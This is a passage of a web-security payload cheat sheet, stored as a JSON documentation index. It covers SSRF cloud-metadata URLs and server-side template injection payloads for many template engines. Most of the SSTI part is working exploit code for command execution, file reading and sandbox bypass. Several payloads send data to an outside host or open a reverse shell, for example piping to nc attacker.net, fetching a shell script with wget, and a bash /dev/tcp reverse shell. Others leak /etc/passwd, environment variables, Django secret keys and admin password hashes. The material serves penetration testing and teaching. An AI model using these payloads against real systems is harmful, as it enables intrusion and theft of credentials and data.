\nhttp://169.254.169.254/metadata/v1/id\nhttp://169.254.169.254/metadata/v1/user-data\nhttp://169.254.169.254/metadata/v1/hostname\nhttp://169.254.169.254/metadata/v1/region\nhttp://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address\nAll in one request:\ncurl http://169.254.169.254/metadata/v1.json | jq\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-packetcloud","title":"SSRF URL for Packetcloud","text":"<p>Documentation available at <code>https://metadata.packet.net/userdata</code></p>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-azure","title":"SSRF URL for Azure","text":"<p>Limited, maybe more exists? <code>https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/</code></p> <pre><code>http://169.254.169.254/metadata/v1/maintenance\n</code></pre> <p>Update Apr 2017, Azure has more support; requires the header \"Metadata: true\" <code>https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service</code></p> <pre><code>http://169.254.169.254/metadata/instance?api-version=2017-04-02\nhttp://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&amp;format=text\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-openstackrackspace","title":"SSRF URL for OpenStack/RackSpace","text":"<p>(header required? unknown)</p> <pre><code>http://169.254.169.254/openstack\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-hp-helion","title":"SSRF URL for HP Helion","text":"<p>(header required? unknown)</p> <pre><code>http://169.254.169.254/2009-04-04/meta-data/ \n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-oracle-cloud","title":"SSRF URL for Oracle Cloud","text":"<pre><code>http://192.0.0.192/latest/\nhttp://192.0.0.192/latest/user-data/\nhttp://192.0.0.192/latest/meta-data/\nhttp://192.0.0.192/latest/attributes/\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-alibaba","title":"SSRF URL for Alibaba","text":"<pre><code>http://100.100.100.200/latest/meta-data/\nhttp://100.100.100.200/latest/meta-data/instance-id\nhttp://100.100.100.200/latest/meta-data/image-id\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-kubernetes-etcd","title":"SSRF URL for Kubernetes ETCD","text":"<p>Can contain API keys and internal ip and ports</p> <pre><code>curl -L http://127.0.0.1:2379/version\ncurl http://127.0.0.1:2379/v2/keys/?recursive=true\n</code></pre>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-docker","title":"SSRF URL for Docker","text":"<pre><code>http://127.0.0.1:2375/v1.24/containers/json\nSimple example\ndocker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash\nbash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json\nbash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json\n</code></pre> <p>More info:</p> <ul> <li>Daemon socket option: https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option</li> <li>Docker Engine API: https://docs.docker.com/engine/api/latest/</li> </ul>"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-rancher","title":"SSRF URL for Rancher","text":"<pre><code>curl http://rancher-metadata/&lt;version&gt;/&lt;path&gt;\n</code></pre> <p>More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/</p>"},{"location":"Server%20Side%20Request%20Forgery/#labs","title":"Labs","text":"<ul> <li>Basic SSRF against the local server</li> <li>Basic SSRF against another back-end system</li> <li>SSRF with blacklist-based input filter</li> <li>SSRF with whitelist-based input filter</li> <li>SSRF with filter bypass via open redirection vulnerability</li> </ul>"},{"location":"Server%20Side%20Request%20Forgery/#references","title":"References","text":"<ul> <li>AppSecEU15-Server_side_browsing_considered_harmful.pdf</li> <li>Extracting AWS metadata via SSRF in Google Acquisition - tghawkins - 2017-12-13</li> <li>ESEA Server-Side Request Forgery and Querying AWS Meta Data by Brett Buerhaus</li> <li>SSRF and local file read in video to gif converter</li> <li>SSRF in https://imgur.com/vidgif/url</li> <li>SSRF in proxy.duckduckgo.com</li> <li>Blind SSRF on errors.hackerone.net</li> <li>SSRF on *shopifycloud.com</li> <li>Hackerone - How To: Server-Side Request Forgery (SSRF)</li> <li>Awesome URL abuse for SSRF by @orange_8361 #BHUSA</li> <li>How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! Orange Tsai</li> <li>#HITBGSEC 2017 SG Conf D1 - A New Era Of SSRF - Exploiting Url Parsers - Orange Tsai</li> <li>SSRF Tips - xl7dev</li> <li>SSRF in https://imgur.com/vidgif/url</li> <li>Les Server Side Request Forgery : Comment contourner un pare-feu - @Geluchat</li> <li>AppSecEU15 Server side browsing considered harmful - @Agarri</li> <li>Enclosed alphanumerics - @EdOverflow</li> <li>Hacking the Hackers: Leveraging an SSRF in HackerTarget - @sxcurity</li> <li>PHP SSRF @secjuice</li> <li>How I convert SSRF to xss in a ssrf vulnerable Jira</li> <li>Piercing the Veil: Server Side Request Forgery to NIPRNet access</li> <li>Hacker101 SSRF</li> <li>SSRF\u8106\u5f31\u6027\u3092\u5229\u7528\u3057\u305fGCE/GKE\u30a4\u30f3\u30b9\u30bf\u30f3\u30b9\u3078\u306e\u653b\u6483\u4f8b</li> <li>SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-1 - SaN ThosH - 10 Jan 2019</li> <li>SSRF Protocol Smuggling in Plaintext Credential Handlers : LDAP - @0xrst</li> <li>X-CTF Finals 2016 - John Slick (Web 25) - YEO QUAN YANG @quanyang</li> <li>Exploiting SSRF in AWS Elastic Beanstalk - February 1, 2019 - @notsosecure</li> <li>PortSwigger - Web Security Academy Server-side request forgery (SSRF)</li> <li>SVG SSRF Cheatsheet - Allan Wirth (@allanlw) - 12/06/2019</li> <li>SSRF\u2019s up! Real World Server-Side Request Forgery (SSRF) - shorebreaksecurity - 2019</li> <li>challenge 1: COME OUT, COME OUT, WHEREVER YOU ARE!</li> <li>Attacking Url's in JAVA</li> <li>SSRF: Don't encode entire IP</li> </ul>"},{"location":"Server%20Side%20Template%20Injection/","title":"Server Side Template Injection","text":"<p>Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages</p>"},{"location":"Server%20Side%20Template%20Injection/#summary","title":"Summary","text":"<ul> <li>Templates Injections</li> <li>Summary</li> <li>Tools</li> <li>Methodology</li> <li>ASP.NET Razor<ul> <li>ASP.NET Razor - Basic injection</li> <li>ASP.NET Razor - Command execution</li> </ul> </li> <li>Expression Language EL<ul> <li>Expression Language EL - Basic injection</li> <li>Expression Language EL - One-Liner injections not including code execution</li> <li>Expression Language EL - Code Execution</li> </ul> </li> <li>Java - Freemarker<ul> <li>Freemarker - Basic injection</li> <li>Freemarker - Read File</li> <li>Freemarker - Code execution</li> <li>Freemarker - Sandbox bypass</li> </ul> </li> <li>Groovy<ul> <li>Groovy - Basic injection</li> <li>Groovy - Read and create File</li> <li>Groovy - HTTP request:</li> <li>Groovy - Command Execution</li> <li>Groovy - Sandbox Bypass</li> </ul> </li> <li>JavaScript - Handlebars<ul> <li>Handlebars - Command Execution</li> </ul> </li> <li>Jade / Codepen</li> <li>Java<ul> <li>Java - Basic injection</li> <li>Java - Retrieve the system\u2019s environment variables</li> <li>Java - Retrieve /etc/passwd</li> </ul> </li> <li>Django Templates</li> <li>Python - Jinja2<ul> <li>Jinja2 - Basic injection</li> <li>Jinja2 - Template format</li> <li>Jinja2 - Debug Statement</li> <li>Jinja2 - Dump all used classes</li> <li>Jinja2 - Dump all config variables</li> <li>Jinja2 - Read remote file</li> <li>Jinja2 - Write into remote file</li> <li>Jinja2 - Remote Code Execution</li> <li>Forcing output on blind RCE</li> <li>Exploit the SSTI by calling os.popen().read()</li> <li>Exploit the SSTI by calling subprocess.Popen</li> <li>Exploit the SSTI by calling Popen without guessing the offset</li> <li>Exploit the SSTI by writing an evil config file.</li> <li>Jinja2 - Filter bypass</li> </ul> </li> <li>Java - Jinjava<ul> <li>Jinjava - Basic injection</li> <li>Jinjava - Command execution</li> </ul> </li> <li>JavaScript - Lessjs<ul> <li>Lessjs - SSRF / LFI</li> <li>Lessjs &lt; v3 - Command Execution</li> <li>Plugins</li> </ul> </li> <li>Python - Mako<ul> <li>Direct access to os from TemplateNamespace:</li> </ul> </li> <li>Java - Pebble<ul> <li>Pebble - Basic injection</li> <li>Pebble - Code execution</li> </ul> </li> <li>Ruby<ul> <li>Ruby - Basic injections</li> <li>Ruby - Retrieve /etc/passwd</li> <li>Ruby - List files and directories</li> <li>Ruby - Code execution</li> </ul> </li> <li>PHP - Smarty</li> <li>PHP - Twig<ul> <li>Twig - Basic injection</li> <li>Twig - Template format</li> <li>Twig - Arbitrary File Reading</li> <li>Twig - Code execution</li> </ul> </li> <li>Java - Velocity</li> <li>Java - Spring</li> <li>PHP - patTemplate</li> <li>PHP - PHPlib</li> <li>PHP - Plates</li> <li>References</li> </ul>"},{"location":"Server%20Side%20Template%20Injection/#tools","title":"Tools","text":"<p>Recommended tools: </p> <p>Tplmap - Server-Side Template Injection and Code Injection Detection and Exploitation Tool</p> <p>e.g:</p> <pre><code>python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell\npython2.7 ./tplmap.py -u \"http://192.168.56.101:3000/ti?user=*&amp;comment=supercomment&amp;link\"\npython2.7 ./tplmap.py -u \"http://192.168.56.101:3000/ti?user=InjectHere*&amp;comment=A&amp;link\" --level 5 -e jade\n</code></pre> <p>SSTImap - Automatic SSTI detection tool with interactive interface based on Tplmap</p> <p>e.g:</p> <pre><code>python3 ./sstimap.py -u 'https://example.com/page?name=John' -s\npython3 ./sstimap.py -u 'https://example.com/page?name=Vulnerable*&amp;message=My_message' -l 5 -e jade\npython3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#methodology","title":"Methodology","text":""},{"location":"Server%20Side%20Template%20Injection/#detection","title":"Detection","text":"<p>In most cases, this polyglot payload will trigger an error in presence of a SSTI vulnerability :</p> <pre><code>${{&lt;%[%'\"}}%\\.\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#aspnet-razor","title":"ASP.NET Razor","text":"<p>Official website</p> <p>Razor is a markup syntax that lets you embed server-based code (Visual Basic and C#) into web pages.</p>"},{"location":"Server%20Side%20Template%20Injection/#aspnet-razor-basic-injection","title":"ASP.NET Razor - Basic injection","text":"<pre><code>@(1+2)\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#aspnet-razor-command-execution","title":"ASP.NET Razor - Command execution","text":"<pre><code>@{\n// C# code\n}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#expression-language-el","title":"Expression Language EL","text":"<p>Official website</p> <p>Expression Language (EL) is mechanism that simplifies the accessibility of the data stored in Java bean component and other object like request, session and application, etc. There are many operators in JSP that are used in EL like arithmetic and logical operators to perform an expression. It was introduced in JSP 2.0</p>"},{"location":"Server%20Side%20Template%20Injection/#expression-language-el-basic-injection","title":"Expression Language EL - Basic injection","text":"<pre><code>${&lt;property&gt;}\n${1+1}\n#{&lt;expression string&gt;}\n#{1+1}\nT(&lt;javaclass&gt;)\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#expression-language-el-properties","title":"Expression Language EL - Properties","text":"<ul> <li>Interesting properties to access <code>String</code>, <code>java.lang.Runtime</code></li> </ul> <pre><code>${2.class}\n${2.class.forName(\"java.lang.String\")}\n${''.getClass().forName('java.lang.Runtime').getMethods()[6].toString()}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#expression-language-el-one-liner-injections-not-including-code-execution","title":"Expression Language EL - One-Liner injections not including code execution","text":"<pre><code>// DNS Lookup\n${\"\".getClass().forName(\"java.net.InetAddress\").getMethod(\"getByName\",\"\".getClass()).invoke(\"\",\"xxxxxxxxxxxxxx.burpcollaborator.net\")}\n// JVM System Property Lookup (ex: java.class.path)\n${\"\".getClass().forName(\"java.lang.System\").getDeclaredMethod(\"getProperty\",\"\".getClass()).invoke(\"\",\"java.class.path\")}\n// Modify session attributes\n${pageContext.request.getSession().setAttribute(\"admin\",true)}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#expression-language-el-code-execution","title":"Expression Language EL - Code Execution","text":"<pre><code>// Common RCE payloads\n''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(&lt;COMMAND STRING/ARRAY&gt;)\n''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(&lt;COMMAND ARRAY/LIST&gt;).start()\n// Method using Runtime\n#{session.setAttribute(\"rtc\",\"\".getClass().forName(\"java.lang.Runtime\").getDeclaredConstructors()[0])}\n#{session.getAttribute(\"rtc\").setAccessible(true)}\n#{session.getAttribute(\"rtc\").getRuntime().exec(\"/bin/bash -c whoami\")}\n// Method using process builder\n${request.setAttribute(\"c\",\"\".getClass().forName(\"java.util.ArrayList\").newInstance())}\n${request.getAttribute(\"c\").add(\"cmd.exe\")}\n${request.getAttribute(\"c\").add(\"/k\")}\n${request.getAttribute(\"c\").add(\"ping x.x.x.x\")}\n${request.setAttribute(\"a\",\"\".getClass().forName(\"java.lang.ProcessBuilder\").getDeclaredConstructors()[0].newInstance(request.getAttribute(\"c\")).start())}\n${request.getAttribute(\"a\")}\n// Method using Reflection &amp; Invoke\n${\"\".getClass().forName(\"java.lang.Runtime\").getMethods()[6].invoke(\"\".getClass().forName(\"java.lang.Runtime\")).exec(\"calc.exe\")}\n${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('whoami')}\n// Method using ScriptEngineManager one-liner\n${request.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec(\\\\\\\"ping x.x.x.x\\\\\\\")\"))}\n// Method using JavaClass\nT(java.lang.Runtime).getRuntime().exec('whoami').x\n// Method using ScriptEngineManager\n${facesContext.getExternalContext().setResponseHeader(\"output\",\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\\\"var x=new java.lang.ProcessBuilder;x.command(\\\\\\\"wget\\\\\\\",\\\\\\\"http://x.x.x.x/1.sh\\\\\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\"))}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#freemarker","title":"Freemarker","text":"<p>Official website</p> <p>Apache FreeMarker\u2122 is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data. </p> <p>You can try your payloads at https://try.freemarker.apache.org</p>"},{"location":"Server%20Side%20Template%20Injection/#freemarker-basic-injection","title":"Freemarker - Basic injection","text":"<p>The template can be :</p> <ul> <li>Default: <code>${3*3}</code> </li> <li>Legacy: <code>#{3*3}</code></li> <li>Alternative: <code>[=3*3]</code> since FreeMarker 2.3.4</li> </ul>"},{"location":"Server%20Side%20Template%20Injection/#freemarker-read-file","title":"Freemarker - Read File","text":"<pre><code>${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(\" \")}\nConvert the returned bytes to ASCII\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#freemarker-code-execution","title":"Freemarker - Code execution","text":"<pre><code>&lt;#assign ex = \"freemarker.template.utility.Execute\"?new()&gt;${ ex(\"id\")}\n[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}\n${\"freemarker.template.utility.Execute\"?new()(\"id\")}\n#{\"freemarker.template.utility.Execute\"?new()(\"id\")}\n[=\"freemarker.template.utility.Execute\"?new()(\"id\")]\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#freemarker-sandbox-bypass","title":"Freemarker - Sandbox bypass","text":"<p> only works on Freemarker versions below 2.3.30</p> <pre><code>&lt;#assign classloader=article.class.protectionDomain.classLoader&gt;\n&lt;#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")&gt;\n&lt;#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)&gt;\n&lt;#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")&gt;\n${dwf.newInstance(ec,null)(\"id\")}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#groovy","title":"Groovy","text":"<p>Official website</p>"},{"location":"Server%20Side%20Template%20Injection/#groovy-basic-injection","title":"Groovy - Basic injection","text":"<p>Refer to https://groovy-lang.org/syntax.html , but <code>${9*9}</code> is the basic injection.</p>"},{"location":"Server%20Side%20Template%20Injection/#groovy-read-and-create-file","title":"Groovy - Read and create File","text":"<pre><code>${String x = new File('c:/windows/notepad.exe').text}\n${String x = new File('/path/to/file').getText('UTF-8')}\n${new File(\"C:\\Temp\\FileName.txt\").createNewFile();}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#groovy-http-request","title":"Groovy - HTTP request:","text":"<pre><code>${\"http://www.google.com\".toURL().text}\n${new URL(\"http://www.google.com\").getText()}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#groovy-command-execution","title":"Groovy - Command Execution","text":"<pre><code>${\"calc.exe\".exec()}\n${\"calc.exe\".execute()}\n${this.evaluate(\"9*9\") //(this is a Script class)}\n${new org.codehaus.groovy.runtime.MethodClosure(\"calc.exe\",\"execute\").call()}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#groovy-sandbox-bypass","title":"Groovy - Sandbox Bypass","text":"<pre><code>${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"whoami\")})\ndef x }\n</code></pre> <p>or</p> <pre><code>${ new groovy.lang.GroovyClassLoader().parseClass(\"@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\")})def x\") }\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#handlebars","title":"Handlebars","text":"<p>Official website</p> <p>Handlebars compiles templates into JavaScript functions.</p>"},{"location":"Server%20Side%20Template%20Injection/#handlebars-command-execution","title":"Handlebars - Command Execution","text":"<pre><code>{{#with \"s\" as |string|}}\n{{#with \"e\"}}\n{{#with split as |conslist|}}\n{{this.pop}}\n{{this.push (lookup string.sub \"constructor\")}}\n{{this.pop}}\n{{#with string.split as |codelist|}}\n{{this.pop}}\n{{this.push \"return require('child_process').execSync('ls -la');\"}}\n{{this.pop}}\n{{#each conslist}}\n{{#with (string.sub.apply 0 codelist)}}\n{{this}}\n{{/with}}\n{{/each}}\n{{/with}}\n{{/with}}\n{{/with}}\n{{/with}}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#jade-codepen","title":"Jade / Codepen","text":"<p>Official website</p> <pre><code>- var x = root.process\n- x = x.mainModule.require\n- x = x('child_process')\n= x.exec('id | nc attacker.net 80')\n</code></pre> <pre><code>#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#java","title":"Java","text":""},{"location":"Server%20Side%20Template%20Injection/#java-basic-injection","title":"Java - Basic injection","text":"<p>Multiple variable expressions can be used, if <code>${...}</code> doesn't work try <code>#{...}</code>, <code>*{...}</code>, <code>@{...}</code> or <code>~{...}</code>.</p> <pre><code>${7*7}\n${{7*7}}\n${class.getClassLoader()}\n${class.getResource(\"\").getPath()}\n${class.getResource(\"../../../../../index.htm\").getContent()}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#java-retrieve-the-systems-environment-variables","title":"Java - Retrieve the system\u2019s environment variables","text":"<pre><code>${T(java.lang.System).getenv()}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#java-retrieve-etcpasswd","title":"Java - Retrieve /etc/passwd","text":"<pre><code>${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}\n${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#django-templates","title":"Django Templates","text":"<p>Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.</p>"},{"location":"Server%20Side%20Template%20Injection/#detection_1","title":"Detection","text":"<pre><code>{% csrf_token %} # Causes error with Jinja2\n{{ 7*7 }}  # Error with Django Templates\nih0vr{{364|add:733}}d121r # Burp Payload -&gt; ih0vr1097d121r\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#django-templates-for-post-exploitation","title":"Django Templates for post-exploitation","text":"<pre><code># Variables\n{{ variable }}\n{{ variable.attr }}\n# Filters\n{{ value|length }}\n# Tags\n{% csrf_token %}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#cross-site-scripting","title":"Cross-site scripting","text":"<pre><code>{{ '&lt;script&gt;alert(3)&lt;/script&gt;' }}\n{{ '&lt;script&gt;alert(3)&lt;/script&gt;' | safe }}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#debug-information-leak","title":"Debug information leak","text":"<pre><code>{% debug %}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#leaking-apps-secret-key","title":"Leaking app\u2019s Secret Key","text":"<pre><code>{{ messages.storages.0.signer.key }}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#admin-site-url-leak","title":"Admin Site URL leak","text":"<pre><code>{% include 'admin/base.html' %}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#admin-username-and-password-hash-leak","title":"Admin username and password hash leak","text":"<pre><code>{% load log %}{% get_admin_log 10 as log %}{% for e in log %}\n{{e.user.get_username}} : {{e.user.password}}{% endfor %}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#jinja2","title":"Jinja2","text":"<p>Official website</p> <p>Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  </p>"},{"location":"Server%20Side%20Template%20Injection/#jinja2-basic-injection","title":"Jinja2 - Basic injection","text":"<pre><code>{{4*4}}[[5*5]]\n{{7*'7'}} would result in 7777777\n{{config.items()}}\n</code></pre> <p>Jinja2 is used by Python Web Frameworks such as Django or Flask. The above injections have been tested on a Flask application.</p>"},{"location":"Server%20Side%20Template%20Injection/#jinja2-template-format","title":"Jinja2 - Template format","text":"<pre><code>{% extends \"layout.html\" %}\n{% block body %}\n&lt;ul&gt;\n{% for user in users %}\n&lt;li&gt;&lt;a href=\"{{ user.url }}\"&gt;{{ user.username }}&lt;/a&gt;&lt;/li&gt;\n{% endfor %}\n&lt;/ul&gt;\n{% endblock %}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#jinja2-debug-statement","title":"Jinja2 - Debug Statement","text":"<p>If the Debug Extension is enabled, a <code>{% debug %}</code> tag will be available to dump the current context as well as the available filters and tests. This is useful to see what\u2019s available to use in the template without setting up a debugger.</p> <pre><code>&lt;pre&gt;{% debug %}&lt;/pre&gt;\n</code></pre> <p>Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement</p>"},{"location":"Server%20Side%20Template%20Injection/#jinja2-dump-all-used-classes","title":"Jinja2 - Dump all used classes","text":"<pre><code>{{ [].class.base.subclasses() }}\n{{''.class.mro()[1].subclasses()}}\n{{ ''.__class__.__mro__[2].__subclasses__() }}\n</code></pre> <p>Access <code>__globals__</code> and <code>__builtins__</code>:</p> <pre><code>{{ self.__init__.__globals__.__builtins__ }}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#jinja2-dump-all-config-variables","title":"Jinja2 - Dump all config variables","text":"<pre><code>{% for key, value in config.iteritems() %}\n&lt;dt&gt;{{ key|e }}&lt;/dt&gt;\n&lt;dd&gt;{{ value|e }}&lt;/dd&gt;\n{% endfor %}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#jinja2-read-remote-file","title":"Jinja2 - Read remote file","text":"<pre><code># ''.__class__.__mro__[2].__subclasses__()[40] = File class\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}\n{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](\"/tmp/flag\").read() }}\n# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398\n{{ get_flashed_messages.__globals__.__builtins__.open(\"/etc/passwd\").read() }}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#jinja2-write-into-remote-file","title":"Jinja2 - Write into remote file","text":"<pre><code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#jinja2-remote-code-execution","title":"Jinja2 - Remote Code Execution","text":"<p>Listen for connection</p> <pre><code>nc -lnvp 8000\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#jinja2-forcing-output-on-blind-rce","title":"Jinja2 - Forcing output on blind RCE","text":"<p>You can import Flask functions to return an output from the vulnerable page.</p> <pre><code>{{\nx.__init__.__builtins__.exec(\"from flask import current_app, after_this_request\n@after_this_request\ndef hook(*args, **kwargs):\nfrom flask import make_response\nr = make_response('Powned')\nreturn r\n\")\n}}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#exploit-the-ssti-by-calling-ospopenread","title":"Exploit the SSTI by calling os.popen().read()","text":"<pre><code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}\n</code></pre> <p>But when <code>__builtins__</code> is filtered, the following payloads are context-free, and do not require anything, except being in a jinja2 Template object:</p> <pre><code>{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}\n{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}\n{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}\n</code></pre> <p>We can use these shorter payloads (this is the shorter payloads known yet):</p> <pre><code>{{ cycler.__init__.__globals__.os.popen('id').read() }}\n{{ joiner.__init__.__globals__.os.popen('id').read() }}\n{{ namespace.__init__.__globals__.os.popen('id').read() }}\n</code></pre> <p>Source @podalirius_ : https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/</p>"},{"location":"Server%20Side%20Template%20Injection/#exploit-the-ssti-by-calling-subprocesspopen","title":"Exploit the SSTI by calling subprocess.Popen","text":"<p> the number 396 will vary depending of the application.</p> <pre><code>{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}\n{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#exploit-the-ssti-by-calling-popen-without-guessing-the-offset","title":"Exploit the SSTI by calling Popen without guessing the offset","text":"<pre><code>{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"ip\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/cat\\\", \\\"flag.txt\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %}\n</code></pre> <p>Simply modification of payload to clean up output and facilitate command input (https://twitter.com/SecGus/status/1198976764351066113) In another GET parameter include a variable named \"input\" that contains the command you want to run (For example: &amp;input=ls)</p> <pre><code>{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#exploit-the-ssti-by-writing-an-evil-config-file","title":"Exploit the SSTI by writing an evil config file.","text":"<pre><code># evil config\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\\n\\nRUNCMD = check_output\\n') }}\n# load the evil config\n{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  \n# connect to evil host\n{{ config['RUNCMD']('/bin/bash -c \"/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/8000 0&gt;&amp;1\"',shell=True) }}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#jinja2-filter-bypass","title":"Jinja2 - Filter bypass","text":"<pre><code>request.__class__\nrequest[\"__class__\"]\n</code></pre> <p>Bypassing <code>_</code></p> <pre><code>http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&amp;class=class&amp;usc=_\n{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}\n{{request|attr([\"_\"*2,\"class\",\"_\"*2]|join)}}\n{{request|attr([\"__\",\"class\",\"__\"]|join)}}\n{{request|attr(\"__class__\")}}\n{{request.__class__}}\n</code></pre> <p>Bypassing <code>[</code> and <code>]</code></p> 